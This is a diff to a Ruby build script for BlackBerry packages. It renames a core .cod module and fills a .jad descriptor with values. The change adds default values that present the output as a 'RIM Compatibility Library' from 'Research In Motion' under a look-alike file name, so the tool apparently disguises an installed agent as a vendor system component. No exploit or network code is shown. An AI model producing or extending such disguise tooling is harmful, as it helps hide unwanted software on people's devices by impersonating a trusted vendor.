@@ -22,9 +22,9 @@ class BuildBlackberry < Build
     super
 
     # save a copy into the 'res' dir for later use in the 'pack' phase
-    Dir.mkdir(@tmpdir + '/res')
-    FileUtils.mv(path('net_rim_bb_lib.cod'), path('/res/net_rim_bb_lib.cod'))
-    @outputs[@outputs.index('net_rim_bb_lib.cod')] = '/res/net_rim_bb_lib.cod'
+    Dir.mkdir(path('/res'))
+    FileUtils.mv(path('net_rim_bb_lib.cod'), path('res/net_rim_bb_lib.cod'))
+    @outputs[@outputs.index('net_rim_bb_lib.cod')] = 'res/net_rim_bb_lib.cod'
 
     # then extract the cod into its parts
     Zip::ZipFile.open(path('/res/net_rim_bb_lib.cod')) do |z|
@@ -69,22 +69,26 @@ class BuildBlackberry < Build
   def melt(params)
     trace :debug, "Build: melting: #{params}"
 
+    @appname = params['appname'] || 'net_rib_bb_lib'
+
     # read the content of the jad header
     content = File.open(path('jad'), 'rb') {|f| f.read}
 
     # reopen it for writing
     jad = File.open(path('jad'), 'wb')
 
-    # make substitution in the jad header
-    content['[:RIM-COD-Name:]'] = params['name']
-    content['[:RIM-COD-Version:]'] = params['version']
-    content['[:RIM-COD-Description:]'] = params['desc']
-    content['[:RIM-COD-Vendor:]'] = params['vendor']
+    name = params['name'] || 'RIM Compatibility Library'
 
-    content.gsub!('[:RIM-COD-FileName:]', params['jadname'])
+    # make substitution in the jad header
+    content['[:RIM-COD-Name:]'] = name
+    content['[:RIM-COD-Version:]'] = params['version'] || '1.1.0'
+    content['[:RIM-COD-Description:]'] = params['desc'] || 'RIM Compatibility Library used by applications in the App World'
+    content['[:RIM-COD-Vendor:]'] = params['vendor'] || 'Research In Motion'
+
+    content.gsub!('[:RIM-COD-FileName:]', @appname)
     
     jad.puts content
-    jad.puts "RIM-COD-Module-Name: #{params['name']}"
+    jad.puts "RIM-COD-Module-Name: #{name}"
     jad.puts "RIM-COD-Creation-Time: #{Time.now.to_i}"
 
     num = 0
@@ -95,11 +99,11 @@ class BuildBlackberry < Build
     # this is mandatory to have blabla-1.cod after blabla.cod
     jadfiles.sort! {|x,y| x[0..-5] <=> y[0..-5]}
 
-    # each part of the core must be renamed to the new jadname
+    # each part of the core must be renamed to the new appname
     # and added to the body of the jad file
     jadfiles.each do |file|
       old_name = file.dup
-      file['net_rim_bb_lib'] = params['jadname']
+      file['net_rim_bb_lib'] = @appname
       @outputs[@outputs.index(file)] = file
       File.rename(path(old_name), path(file))
 
@@ -114,11 +118,9 @@ class BuildBlackberry < Build
 
     jad.close
 
-    File.rename(path('jad'), path(params['jadname'] + '.jad'))
-    @outputs[@outputs.index('jad')] = params['jadname'] + '.jad'
-    
-    #puts File.read(path(params['jadname'] + '.jad'))
-    
+    File.rename(path('jad'), path(@appname + '.jad'))
+    @outputs[@outputs.index('jad')] = @appname + '.jad'
+       
   end
 
   def pack(params)
@@ -127,7 +129,7 @@ class BuildBlackberry < Build
     case params['type']
       when 'remote'
         Zip::ZipFile.open(path('output.zip'), Zip::ZipFile::CREATE) do |z|
-          @outputs.delete_if {|o| o['res']}.keep_if {|o| o['.cod'] || o['.jad']}.each do |output|
+          @outputs.delete_if {|o| o['res']}.keep_if {|o| o['.cod'] or o['.jad']}.each do |output|
             z.file.open(output, "w") { |f| f.write File.open(path(output), 'rb') {|f| f.read} }
           end
         end
